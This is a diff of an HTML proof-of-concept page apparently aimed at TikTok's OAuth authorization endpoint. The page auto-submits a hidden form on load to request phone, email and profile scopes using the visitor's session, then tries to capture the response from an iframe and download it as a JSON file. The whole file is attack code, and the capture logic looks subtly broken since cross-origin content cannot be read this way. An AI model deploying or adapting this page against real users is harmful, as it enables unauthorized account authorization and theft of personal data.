@@ -1,13 +1,42 @@
+<!DOCTYPE html>
 <html>
-	<body>
-		<form name='myForm' id='myForm' method="POST" action="https://www.tiktok.com/passport/open/web/auth/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Ccomment.list.manage%2Cuser.info.showcase%2Cvideo.list.private_ads.no_watermark%2Cuser.info.username%2Cvideo.list.no_watermark%2Cvideo.list%2Cuser.info.phone%2Cuser.info.email%2Cvideo.list.manage%2Clive.list%2Ccomment.list&aid=1459&source=webview&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback%3Flogin_only%3D1%26page_name%3Dlog_in%26channel%3Dundefined%26redirect_url%3Dhttps%253A%252F%252Fseller-id.tiktok.com%252Fhomepage%253Fregion_check%253D1%26url_params%3D%26state%3Dpbm6v8&state=pbm6v8">
-			<input type="hidden" name="{}" value="undefined"/>
-			<input type="submit" value="Submit">
-		</form>
-		<script>
-			document.addEventListener('DOMContentLoaded', function(event) {
-				document.createElement('form').submit.call(document.getElementById('myForm'));
-				});
-		</script>
-	</body>
-<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body onload="submitForm()">
+    <form name='myForm' id='myForm' method="POST" target="responseFrame" action="https://www.tiktok.com/passport/open/web/auth/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Cuser.info.username%2Cuser.info.phone%2Cuser.info.email&aid=1459&source=web&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback%3Flogin_only%3D1%26page_name%3Dlog_in%26channel%3Dundefined%26redirect_url%3Dhttps%253A%252F%252Fseller-id.tiktok.com%252Fhomepage%253Fregion_check%253D1%26url_params%3D%26state%3Dmagkw&state=magkw">
+        <input type="hidden" name="contentField" value="undefined" />
+    </form>
+    <center><iframe id="responseFrame" name="responseFrame" style="width: 300px; height: 300px;"></iframe></center>
+
+    <script>
+        function submitForm() {
+            document.getElementById('responseFrame').style.display = "block"; // show the iframe
+            document.getElementById('myForm').submit(); // submit the form
+
+            // capture the content from the iframe
+            var iframe = document.getElementById('responseFrame');
+            iframe.onload = function() {
+                var iframeDoc = iframe.contentWindow.document;
+                var content = JSON.stringify(iframeDoc);
+
+                // Set the download URL for the captured content
+                var blob = new Blob([content], {
+                    type: "text/plain"
+                });
+                var url = URL.createObjectURL(blob);
+
+                // Trigger the automatic download
+                var link = document.createElement("a");
+                link.href = url;
+                link.download = "captured_content.json";
+                link.style.display = "none";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            };
+        }
+    </script>
+</body>
+</html>
